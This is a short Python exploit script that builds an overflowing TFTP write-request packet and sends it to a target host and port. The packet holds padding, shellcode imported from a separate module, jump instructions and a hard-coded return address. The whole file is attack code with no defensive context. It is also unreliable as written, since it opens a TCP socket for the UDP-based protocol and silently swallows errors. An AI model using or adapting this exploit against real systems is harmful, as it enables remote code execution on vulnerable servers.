import socket
import sys
import time


from payload import buf

import struct
def shell_attack(target_machine, target_port): 
    host = target_machine
    port = target_port
    pad0x1 = b'A' * 400 # jumping the 0x00 monster :s
    pad0x2 = b'A' * (1487 -len(buf)-400)
    jump_back = b'\xE9\xC1\xFB\xFF\xFF' # fly fly baby 
    Short_jump =b'\xEB\xf9\x90\x90' 
    return_addr = b'\x2b\x0e\x41\x00' # universal

    mode = b'netascii'
    payload = pad0x1 + buf+ pad0x2 + jump_back + Short_jump + return_addr

    Packet = b"\x00\x02" + payload + b"\0" + mode +b"\0"

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.sendto(Packet, (host, port))
            
        except:
           pass
        print("ss")
    except:
        print("TSV")
        